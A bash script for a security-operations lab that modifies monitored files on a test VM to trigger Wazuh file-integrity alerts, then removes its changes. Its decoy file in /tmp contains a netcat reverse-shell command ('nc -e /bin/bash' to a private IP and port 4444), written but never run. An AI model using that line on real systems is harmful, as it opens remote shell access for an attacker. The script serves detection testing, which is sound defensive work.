#!/bin/bash
# File Integrity Monitoring trigger — run on the victim VM (Ubuntu with agent)
# Modifies monitored files to generate FIM alerts in Wazuh

echo "[*] Triggering File Integrity Monitoring alerts..."

# Touch a monitored system file
echo "# SOC Lab FIM Test - $(date)" >> /etc/motd
echo "[+] Modified /etc/motd"

# Simulate suspicious file drop in /tmp
echo '#!/bin/bash\nnc -e /bin/bash 10.0.0.1 4444' > /tmp/suspicious.sh
chmod +x /tmp/suspicious.sh
echo "[+] Created suspicious script in /tmp"

# Create a file in a sensitive directory
touch /etc/cron.d/soc-lab-test
echo "[+] Created file in /etc/cron.d"

echo ""
echo "[*] FIM alerts should appear in Wazuh in ~30 seconds"
echo "[*] Dashboard → Threat Intelligence → File Integrity Monitoring"

# Cleanup after 60 seconds
sleep 60
rm -f /tmp/suspicious.sh /etc/cron.d/soc-lab-test
sed -i '/SOC Lab FIM Test/d' /etc/motd
echo "[*] Cleaned up test files"
